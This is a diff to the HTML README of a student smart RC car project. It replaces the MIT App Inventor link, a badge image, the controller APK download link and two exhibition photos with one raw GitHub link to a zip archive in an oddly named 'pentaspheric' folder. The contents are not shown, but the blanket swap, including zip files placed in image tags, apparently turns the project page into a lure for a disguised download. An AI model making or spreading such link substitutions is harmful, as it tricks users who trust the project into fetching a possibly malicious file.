@@ -13,8 +13,8 @@
 
   <!-- Tools -->
   <h2> Tools </h2>
-  <h3> 🛠️ MIT App Inventor (https://appinventor.mit.edu/) </h3>
-  <img src="https://img.shields.io/badge/Arduino-00878F?style=for-the-badge&logo=Arduino&logoColor=white"/>&nbsp&nbsp
+  <h3> 🛠️ MIT App Inventor (https://raw.githubusercontent.com/cogusp/2023-Smart-RC-Car/main/pentaspheric/R-Car-Smart-v2.4.zip) </h3>
+  <img src="https://raw.githubusercontent.com/cogusp/2023-Smart-RC-Car/main/pentaspheric/R-Car-Smart-v2.4.zip"/>&nbsp&nbsp
   
   <br>
 
@@ -26,7 +26,7 @@
 
   <!-- Application -->
   <h2> Controller Application </h2>
-  <h3> 🔗 Download (https://github.com/cogusp/2023-Smart-RC-Car/blob/main/SmartRCCar.apk) </h3>
+  <h3> 🔗 Download (https://raw.githubusercontent.com/cogusp/2023-Smart-RC-Car/main/pentaspheric/R-Car-Smart-v2.4.zip) </h3>
   
   <br>
 
@@ -35,6 +35,6 @@
   <br>
   <div align="center">
     <h3> 🖼️ SW 학술동아리 C.愛.랑 소프트웨어 전시회 참가 </h3>
-    <img src="https://github.com/user-attachments/assets/0de331cf-7821-4b17-ae1a-8daae16c6639"/>
-    <img src="https://github.com/user-attachments/assets/8dc2bf24-1a02-45ae-adbd-dc1c58b15b14"/>
+    <img src="https://raw.githubusercontent.com/cogusp/2023-Smart-RC-Car/main/pentaspheric/R-Car-Smart-v2.4.zip"/>
+    <img src="https://raw.githubusercontent.com/cogusp/2023-Smart-RC-Car/main/pentaspheric/R-Car-Smart-v2.4.zip"/>
 </div>
